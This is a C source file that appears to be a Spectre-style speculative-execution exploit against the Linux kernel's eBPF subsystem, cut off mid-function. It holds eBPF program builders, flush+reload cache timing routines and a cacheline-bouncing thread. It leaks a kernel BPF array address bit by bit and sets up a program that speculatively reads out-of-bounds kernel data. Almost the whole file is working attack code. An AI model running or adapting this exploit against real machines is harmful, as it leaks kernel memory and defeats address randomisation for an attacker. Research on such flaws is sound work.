#define _GNU_SOURCE
#include <pthread.h>
#include <assert.h>
#include <err.h>
#include <stdint.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <asm/unistd_64.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <pthread.h>
#include <errno.h>
#include <limits.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stddef.h>
#include <signal.h>
#include <string.h>
#include <ctype.h>
#include <sys/mman.h>
#include <sys/user.h>



#define KERNEL_4_4_NOLOCKDEP



#define GPLv2 "GPL v2"
#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))



#define __aligned(x)    __attribute__((aligned(x)))
typedef struct { int counter; } atomic_t;
typedef struct { long __aligned(8) counter; } atomic64_t;
typedef atomic64_t atomic_long_t;
struct list_head {
  void *next, *prev;
};
struct work_struct {
  atomic_long_t data;
  struct list_head entry;
  void *func;
};
#if defined(KERNEL_4_11_NOLOCKDEP)
struct bpf_map {
  atomic_t refcnt;
  int map_type;
  int key_size;
  int value_size;
  int max_entries;
  int map_flags;
  int pages;
  void *user;
  void *ops;
  struct work_struct work;
  atomic_t usercnt;
};
#elif defined(KERNEL_4_4_NOLOCKDEP)
struct bpf_map {
  atomic_t refcnt;
  int map_type;
  int key_size;
  int value_size;
  int max_entries;
  int pages;
  void *user;
  void *ops;
  struct work_struct work;
  atomic_t usercnt;
};
#endif
struct bpf_array {
  struct bpf_map map;
  int elem_size;
  int owner_prog_type;
  bool owner_jited;
  char value[0] __aligned(8);
};
#define BPF_ARRAY_VALUE_OFFSET (offsetof(struct bpf_array, value))
struct bpf_prog {
  unsigned short  pages;          /* Number of allocated pages */
  unsigned short  jited:1,        /* Is our filter JIT'ed? */
                  locked:1,       /* Program image locked? */
                  gpl_compatible:1, /* Is filter GPL compatible? */
                  cb_access:1,    /* Is control block accessed? */
                  dst_needed:1,   /* Do we need dst entry? */
                  xdp_adjust_head:1; /* Adjusting pkt head? */
  int             type;           /* Type of BPF program */
  unsigned int    len;            /* Number of filter blocks */
  unsigned char   tag[8];
  void            *aux;           /* Auxiliary fields */
  void            *orig_prog;     /* Original BPF program */
  void            *bpf_func;
};


/* registers */
/* caller-saved: r0..r5 */
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_REG_CTX     BPF_REG_6
#define BPF_REG_FP      BPF_REG_10

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_MOV64_REG(DST, SRC)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)        \
  ((struct bpf_insn) {                          \
    .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,\
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = OFF,                               \
    .imm   = 0 })
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EMIT_CALL(FUNC)                     \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_CALL,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = (FUNC) })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)          \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = OFF,                               \
    .imm   = IMM })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_LD_ABS(SIZE, IMM)                   \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_SIZE(SIZE) | BPF_ABS, \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = 0 })
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })

/* this should jump forward in the error case so that the static branch prediction
 * goes the right way (if we hit the static branch prediction for some reason)
 */
#define BPF_GOTO_EXIT_IF_R0_NULL                \
  BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 0x7ff)


int bpf_(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int array_create(int value_size, int num_entries) {
  union bpf_attr create_map_attrs = {
      .map_type = BPF_MAP_TYPE_ARRAY,
      .key_size = 4,
      .value_size = value_size,
      .max_entries = num_entries
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");
  return mapfd;
}

int prog_load(struct bpf_insn *insns, size_t insns_count) {
  char verifier_log[100000];
  union bpf_attr create_prog_attrs = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = insns_count,
    .insns = (uint64_t)insns,
    .license = (uint64_t)GPLv2,
    .log_level = 1,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };
  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
  int errno_ = errno;
  printf("==========================\n%s==========================\n", verifier_log);
  errno = errno_;
  if (progfd == -1)
    err(1, "prog load");
  return progfd;
}

int create_filtered_socket_fd(struct bpf_insn *insns, size_t insns_count) {
  int progfd = prog_load(insns, insns_count);

  // hook eBPF program up to a socket
  // sendmsg() to the socket will trigger the filter
  // returning 0 in the filter should toss the packet
  int socks[2];
  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
    err(1, "socketpair");
  if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
    err(1, "setsockopt");
  return socks[1];
}

void user_flush_cacheline(void *arg) {
  asm volatile(
    "mov $0, %%eax\n\t"
    "cpuid\n\t" /* pleeeease don't do this speculatively :/ */
    "clflush %0"
  : "+m" (*(volatile char *)arg)
  : /* no inputs */
  : "ax", "bx", "cx", "dx");
}

int user_timed_reload(void *arg) {
  int tsc1, tsc2, read_copy;
  asm volatile(
    "mov $0, %%eax\n\t"
    "cpuid\n\t" /* serialize; clobbers eax, ebx, ecx, edx */
    "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
    "mov %%eax, %0\n\t"
    "mov (%3), %%eax\n\t"
    "mov %%eax, %2\n\t"
    "rdtscp\n\t" /* counter into eax; clobbers edx, ecx */
    "mov %%eax, %1\n\t"
  : "=&r"(tsc1), "=&r"(tsc2), "=&r"(read_copy)
  : "r"((unsigned int *)arg)
  : "ax", "bx", "cx", "dx");
  return tsc2 - tsc1;
}

/* assumes 32-bit values */
void array_set(int mapfd, uint32_t key, uint32_t value) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };

  int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
  if (res)
    err(1, "map update elem");
}

void array_set_dw(int mapfd, uint32_t key, uint64_t value) {
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };

  int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
  if (res)
    err(1, "map update elem");
}

/* assumes 32-bit values */
uint32_t array_get(int mapfd, uint32_t key) {
  uint32_t value = 0;
  union bpf_attr attr = {
    .map_fd = mapfd,
    .key    = (uint64_t)&key,
    .value  = (uint64_t)&value,
    .flags  = BPF_ANY,
  };
  int res = bpf_(BPF_MAP_LOOKUP_ELEM, &attr);
  if (res)
    err(1, "map lookup elem");
  return value;
}

struct array_timed_reader_prog {
  int control_array;
  int sockfd;
};

struct array_timed_reader_prog create_timed_reader_prog(int timed_array_fd) {
  struct array_timed_reader_prog ret;

  /*
   * slot 0: timed_array index
   * slot 1: measured time delta
   */
  ret.control_array = array_create(4, 2);

  struct bpf_insn insns[] = {
    /*
     * setup: get pointer to timed_array slot
     * r7 = &timed_array[control_array[0]]
     */
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.control_array),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_W, BPF_REG_0, BPF_REG_0, 0),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_STX_MEM(BPF_W, BPF_REG_ARG2, BPF_REG_0, 0),
    BPF_LD_MAP_FD(BPF_REG_ARG1, timed_array_fd),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

    /* lfence and get time */
    BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

    /* do the actual load */
    BPF_LDX_MEM(BPF_B, BPF_REG_7, BPF_REG_7, 0),

    /*
     * lfence and get time delta
     * r6 = ktime_get_ns() - r6
     */
    BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
    BPF_ALU64_REG(BPF_SUB, BPF_REG_0, BPF_REG_6),
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

    /* store time delta */
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.control_array),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
    BPF_EXIT_INSN(),
    BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_6, 0),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };

  ret.sockfd = create_filtered_socket_fd(insns, ARRSIZE(insns));
  return ret;
}

void trigger_proc(int sockfd) {
  if (write(sockfd, "X", 1) != 1)
    err(1, "write to proc socket failed");
}

uint32_t perform_timed_read(struct array_timed_reader_prog *prog, int index) {
  array_set(prog->control_array, 0, index);
  array_set(prog->control_array, 1, 0x13371337); /* poison, for error detection */
  trigger_proc(prog->sockfd);
  uint32_t res = array_get(prog->control_array, 1);
  if (res == 0x13371337)
    errx(1, "got poison back after timed read, eBPF code is borked");
  return res;
}

void exit_fixup(struct bpf_insn *insns, size_t arrsize) {
  int exit_idx = arrsize - 1;
  for (int i=0; i<arrsize; i++) {
    if (insns[i].code == (BPF_JMP | BPF_OP(BPF_JEQ) | BPF_K) && insns[i].off == 0x7ff) {
      printf("fixing up exit jump\n");
      insns[i].off = exit_idx - i - 1;
    }
  }
}


#define PAGE_SIZE_LOG2 (12)
#define FP_PAGES_PER_VMA_LOG2 (4)
#define FP_PAGES_PER_VMA (1UL<<FP_PAGES_PER_VMA_LOG2)
#define FP_VMA_COUNT_LOG2 (15)
#define FP_VMA_COUNT (1UL<<FP_VMA_COUNT_LOG2)

#define FP_MAPPING_SIZE (PAGE_SIZE * FP_PAGES_PER_VMA)
#define FP_SPAM_AREA_SIZE (FP_MAPPING_SIZE * FP_VMA_COUNT)

// 1 means "bounce it", -1 means "exit now"
volatile int cacheline_bounce_status;
int cacheline_bounce_fds[2];
void *cacheline_bounce_worker(void *arg) {
  // pin to core 3
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(3, &set);
  if (sched_setaffinity(0, sizeof(cpu_set_t), &set))
    err(1, "sched_setaffinity");

  while (1) {
    __sync_synchronize();
    int cacheline_bounce_status_copy;
    while ((cacheline_bounce_status_copy = cacheline_bounce_status) == 0) /* loop */;
    if (cacheline_bounce_status_copy == -1)
      return NULL;
    __sync_synchronize();

    struct bpf_insn insns[] = {
      BPF_LD_MAP_FD(BPF_REG_0, cacheline_bounce_fds[0]),
      BPF_LD_MAP_FD(BPF_REG_0, cacheline_bounce_fds[1]),
      BPF_LD_MAP_FD(BPF_REG_0, 0xffffff)
    };
    union bpf_attr attr = {
      .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
      .insn_cnt = ARRSIZE(insns),
      .insns = (__aligned_u64) insns,
      .license = (__aligned_u64)GPLv2
    };
    if (bpf_(BPF_PROG_LOAD, &attr) != -1 || errno != EBADF)
      errx(1, "unexpected BPF_PROG_LOAD return on cacheline bounce");

    __sync_synchronize();
    cacheline_bounce_status = 0;
    __sync_synchronize();
  }
}
void bounce_cacheline(int fd) {
  cacheline_bounce_fds[0] = fd;
  cacheline_bounce_fds[1] = fd;
  __sync_synchronize();
  cacheline_bounce_status = 1;
  __sync_synchronize();
  while (cacheline_bounce_status != 0) __sync_synchronize();
  __sync_synchronize();
}
void bounce_two_cachelines(int fd1, int fd2) {
  cacheline_bounce_fds[0] = fd1;
  cacheline_bounce_fds[1] = fd2;
  __sync_synchronize();
  cacheline_bounce_status = 1;
  __sync_synchronize();
  while (cacheline_bounce_status != 0) __sync_synchronize();
  __sync_synchronize();
}
pthread_t cacheline_bounce_thread;
void cacheline_bounce_worker_enable(void) {
  cacheline_bounce_status = 0;
  if (pthread_create(&cacheline_bounce_thread, NULL, cacheline_bounce_worker, NULL))
    errx(1, "pthread_create");
}
void cacheline_bounce_worker_disable(void) {
  cacheline_bounce_status = -1;
  if (pthread_join(cacheline_bounce_thread, NULL))
    errx(1, "pthread_join");
}

// assumes that prog_map is an FD referencing an eBPF program
// array with a reference to a program that simply returns zero
// in its first slot.
unsigned long get_prog_map_addr(int prog_map) {
  // allocate virtual address space
  char *area = mmap(NULL, FP_SPAM_AREA_SIZE, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0);
  if (area == MAP_FAILED)
    err(1, "mmap");
  munmap(area, FP_SPAM_AREA_SIZE);

  // create tmpfile
  int fd = open("/tmp", O_TMPFILE|O_RDWR, 0600);
  if (fd == -1)
    err(1, "open tmpfile");
  if (ftruncate(fd, FP_MAPPING_SIZE + PAGE_SIZE))
    err(1, "ftruncate");

  // create VMAs and fault them in
  for (char *addr = area; addr < area + FP_SPAM_AREA_SIZE; addr += FP_MAPPING_SIZE) {
    if (mmap(addr, FP_MAPPING_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_POPULATE|MAP_NORESERVE, fd, 0) != addr)
      err(1, "mmap 2");
  }

  // create VMAs in an anti-stride-detection pattern
  // 15 prime intervals: 
  unsigned long prime_intervals[] = {
    2,3,5,7, 11,13,17,19, 23,29,31,37, 41,43,47
  };
  char *prime_mappings[FP_PAGES_PER_VMA];
  assert(sizeof(prime_intervals)/sizeof(prime_intervals[0]) == FP_PAGES_PER_VMA-1);
  unsigned long prime_mapping_area_pages = 1/*first page*/ + 20/*safety padding*/;
  for (unsigned long i=0; i<FP_PAGES_PER_VMA-1; i++) prime_mapping_area_pages += prime_intervals[i];
  char *pmap_area = mmap(NULL, PAGE_SIZE * prime_mapping_area_pages, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0);
  if (pmap_area == MAP_FAILED)
    err(1, "mmap 3");
  char *pmap_area_ptr = pmap_area + PAGE_SIZE * 10; /* safety padding */
  for (unsigned long i=0; i<FP_PAGES_PER_VMA; i++) {
    prime_mappings[i] = pmap_area_ptr;
    char *mmap_res = mmap(prime_mappings[i], PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_POPULATE|MAP_NORESERVE, fd, i * PAGE_SIZE);
    if (mmap_res != prime_mappings[i])
      err(1, "mmap 4");
    pmap_area_ptr += PAGE_SIZE * prime_intervals[i];
  }

  int data_map = array_create(8, 2);

  struct bpf_insn finder_insns[] = {
    // save context for tail call
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_ARG1),

    // r3 = prog_array_base_offset = *map_lookup_elem(data_map, &1)
    BPF_LD_MAP_FD(BPF_REG_ARG1, data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_0, 0),

    BPF_LD_MAP_FD(BPF_REG_ARG2, prog_map),
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_6),

    BPF_EMIT_CALL(BPF_FUNC_tail_call),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  exit_fixup(finder_insns, ARRSIZE(finder_insns));
  int sockfd = create_filtered_socket_fd(finder_insns, ARRSIZE(finder_insns));

  cacheline_bounce_worker_enable();

full_retry_find:;
  bool found_high_low_order = false;
  bool conflicting_high_low_order = false;
  unsigned long high_low_order_success_addr = 0;
  int partial_retries = 0;

  while (1) {
    for (unsigned long high_order_guess = 0xffff880000000000; high_order_guess >= 0xffff880000000000; high_order_guess += FP_SPAM_AREA_SIZE) {
      for (int mislead_i = 0; mislead_i < 33; mislead_i++) {
        if ((mislead_i&7) != 7) {
          array_set_dw(data_map, 1, 0); // execute instaquit program
        } else {
          array_set_dw(data_map, 1, ((unsigned long)area - (high_order_guess + BPF_ARRAY_VALUE_OFFSET)) / 8);

          for (unsigned long in_vma_offset=0; in_vma_offset<FP_PAGES_PER_VMA; in_vma_offset++) {
            user_flush_cacheline(prime_mappings[in_vma_offset]);
          }

          bounce_cacheline(prog_map);
        }
        trigger_proc(sockfd);
        if ((mislead_i&7) == 7) {
          for (unsigned long in_vma_offset=0; in_vma_offset<FP_PAGES_PER_VMA; in_vma_offset++) {
            int reload_time = user_timed_reload(prime_mappings[in_vma_offset]);
            if (reload_time < 200) {
              unsigned long curr_addr = high_order_guess | (in_vma_offset * PAGE_SIZE);
              printf("reload_time %d at 0x%lx\n", reload_time, curr_addr);
              if (!found_high_low_order) {
                high_low_order_success_addr = curr_addr;
                found_high_low_order = true;
              } else if (high_low_order_success_addr != curr_addr) {
                conflicting_high_low_order = true;
              }
            }
          }
        }
      }
    }
    if (conflicting_high_low_order) {
      printf("WARNING: two hits found, shouldn't happen. retrying.\n");
    } else if (!found_high_low_order) {
      printf("huh, nothing found. retrying...\n");
    } else {
      printf("high-order and low-order bits look good\n");
      break;
    }
    found_high_low_order = false;
    conflicting_high_low_order = false;
  }
  /* clean up a bit */
  munmap(area, FP_SPAM_AREA_SIZE);

partial_retry_find:;
  printf("leaking middle offset...\n");
  unsigned long leaked_addr = high_low_order_success_addr;
  for (
          int middle_bit_idx = PAGE_SIZE_LOG2+FP_PAGES_PER_VMA_LOG2+FP_VMA_COUNT_LOG2-1;
          middle_bit_idx >= PAGE_SIZE_LOG2+FP_PAGES_PER_VMA_LOG2;
          middle_bit_idx--) {
    printf("testing for bit %d (0x%lx): ", middle_bit_idx, 1UL<<middle_bit_idx);
    area = mmap(NULL, (1UL<<(middle_bit_idx+1)) + FP_MAPPING_SIZE, PROT_NONE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0);
    if (area == MAP_FAILED)
      err(1, "mmap bisect 1");
    for (char *addr = area; addr < area + (1UL<<(middle_bit_idx+1)); addr += FP_MAPPING_SIZE) {
      unsigned long file_off = (addr-area) < (1UL<<middle_bit_idx) ? 0 : 0x1000;
      /* maps more than needed to avoid needing PROT_NONE VMAs to prevent libc allocs in the same area.
       * PROT_NONE VMAs count towards the VMA limit (2^16), so they're bad for us.
       * if this turns out to be problematic for some reason, could fix it up
       * by using some region libc won't use or whatever.
       */
      char *mmap_res = mmap(addr, FP_MAPPING_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_POPULATE|MAP_NORESERVE, fd, file_off);
      if (mmap_res != addr)
        err(1, "mmap bisect 2");
    }

    int votes_0 = 0, votes_1 = 0;
    int errors00 = 0, errors11 = 0;
    for (int mislead_i = 0; mislead_i < 65; mislead_i++) {
      if ((mislead_i&7) != 7) {
        array_set_dw(data_map, 1, 0); // execute instaquit program
      } else {
        array_set_dw(data_map, 1, ((unsigned long)area - (leaked_addr + BPF_ARRAY_VALUE_OFFSET)) / 8);

        user_flush_cacheline(prime_mappings[0]);
        user_flush_cacheline(prime_mappings[1]);

        bounce_cacheline(prog_map);
      }
      trigger_proc(sockfd);
      if ((mislead_i&7) == 7) {
        int reload_time_0 = user_timed_reload(prime_mappings[0]);
        int reload_time_1 = user_timed_reload(prime_mappings[1]);
        bool cached_0 = (reload_time_0 < 200);
        bool cached_1 = (reload_time_1 < 200);
        if (cached_0 && !cached_1)
          votes_0++;
        if (!cached_0 && cached_1)
          votes_1++;
        if (!cached_0 && !cached_1)
          errors00++;
        if (cached_0 && cached_1)
          errors11++;
      }
    }

    munmap(area, (1UL<<(middle_bit_idx+1)) + FP_MAPPING_SIZE);

    int decided_bit = (votes_0 > votes_1) ? 0 : 1;
    unsigned long addr_mixin = decided_bit ? (1UL<<middle_bit_idx) : 0;
    leaked_addr |= addr_mixin;
    printf("votes: %d vs %d; errors: %d, %d; decided_bit=%d; addr_mixin=0x%lx; leaked_addr=0x%lx\n",
      votes_0, votes_1, errors00, errors11, decided_bit, addr_mixin, leaked_addr);
    if (votes_0 + votes_1 < 3) {
      puts("votecount suspiciously low");
      partial_retries++;
      if (partial_retries == 10) {
        goto full_retry_find;
      } else {
        goto partial_retry_find;
      }
    }
  }

  cacheline_bounce_worker_disable();
  munmap(pmap_area, PAGE_SIZE * prime_mapping_area_pages);
  close(fd);

  printf("LEAKED BPF ARRAY POINTER: 0x%lx\n", leaked_addr);
  return leaked_addr;
}

struct mem_leaker_prog {
  int victim_map;
  int data_map;
  int prog_map;

  int sockfd;

  unsigned long progmap_lenp;
  unsigned long progmap_data;
};

struct mem_leaker_prog load_mem_leaker_prog(void) {
  struct mem_leaker_prog ret;

  union bpf_attr create_prog_map_attrs = {
    .map_type = BPF_MAP_TYPE_PROG_ARRAY,
    .key_size = 4,
    .value_size = 4,
    .max_entries = 2048/8 + 1 /* kmalloc-4096 slab for fixed in-page alignment */
  };
  ret.prog_map = bpf_(BPF_MAP_CREATE, &create_prog_map_attrs);
  if (ret.prog_map == -1)
    err(1, "map create");
  unsigned long progmap_head = get_prog_map_addr(ret.prog_map);
  ret.progmap_lenp = progmap_head + 16;
  ret.progmap_data = progmap_head + BPF_ARRAY_VALUE_OFFSET;

  struct bpf_insn quitter_insns[] = {
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  int quitter_prog = prog_load(quitter_insns, ARRSIZE(quitter_insns));
  array_set(ret.prog_map, 0, quitter_prog);

  ret.victim_map = array_create(8, 5/*whatever*/);

  // control runtime behavior with this.
  // slot 0: index of secret value
  // slot 1: start offset in prog_map
  // slot 2: bitmask (1/2/4/8/...)
  // slot 3: bitshift selector (0/1/2/3/...)
  ret.data_map = array_create(8, 4);

  struct bpf_insn insns[] = {
    // save context for tail call
    BPF_MOV64_REG(BPF_REG_6, BPF_REG_ARG1),

    // r7 = bitmask
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 2),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

    // r9 = bitshift selector
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 3),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 0),

    // r8 = prog_array_base_offset = *map_lookup_elem(data_map, &1)
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 1),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),

    // r0 = secret_data_offset = *map_lookup_elem(data_map, &0)
    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.data_map),
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_ST_MEM(BPF_W, BPF_REG_ARG2, 0, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
    BPF_GOTO_EXIT_IF_R0_NULL,
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_0, 0),

    // r2 = &secret_data_offset
    BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -4),
    BPF_STX_MEM(BPF_W, BPF_REG_ARG2, BPF_REG_0, 0),


    BPF_LD_MAP_FD(BPF_REG_ARG1, ret.victim_map),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem), /* speculative execution starts in here */
    BPF_GOTO_EXIT_IF_R0_NULL, /* predicted: non-NULL, actual: NULL */
    BPF_LDX_MEM(BPF_DW, BPF_REG_ARG3, BPF_REG_0, 0),

    /*
     * mask and shift secret value so that it maps to one of two cachelines.
     */
    BPF_ALU64_REG(BPF_AND, BPF_REG_ARG3, BPF_REG_7),
    BPF_ALU64_REG(BPF_RSH, BPF_REG_ARG3, BPF_REG_9),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_ARG3, 7),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_ARG3, BPF_REG_8),

    BPF_LD_MAP_FD(BPF_REG_ARG2, ret.prog_map),
    BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_6),

    BPF_EMIT_CALL(BPF_FUNC_tail_call),

    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };

  int exit_idx = ARRSIZE(insns) - 1;
  for (int i=0; i<ARRSIZE(insns); i++) {
    if (insns[i].code == (BPF_JMP | BPF_OP(BPF_JEQ) | BPF_K) && insns[i].off == 0x7ff) {
      printf("fixing up exit jump\n");
      insns[i].off = exit_idx - i - 1;
    }
  }

  ret.sockfd = create_filtered_socket_fd(insns, ARRSIZE(insns));

  return ret;
}

#define ABS(x) ((x)<0 ? -(x) : (x))

int leak_bit(struct mem_leaker_prog *leakprog, unsigned long dw_offset,
        unsigned long in_dw_bit_offset,
